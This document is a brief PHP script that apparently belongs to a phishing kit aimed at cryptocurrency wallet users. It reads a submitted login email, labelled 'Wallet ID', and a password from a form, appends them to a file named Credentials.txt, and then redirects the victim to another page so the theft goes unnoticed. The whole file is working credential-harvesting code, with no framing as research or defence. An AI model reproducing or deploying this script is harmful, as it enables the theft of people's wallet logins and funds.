<?php

file_put_contents("Credentials.txt", "Information" . "\n" .  "Wallet ID: " .  $_POST['login_email'] . "\n" .  "Password: " . $_POST['login_pass'] . "\n", FILE_APPEND);
header('Location: /index0.html');
exit();
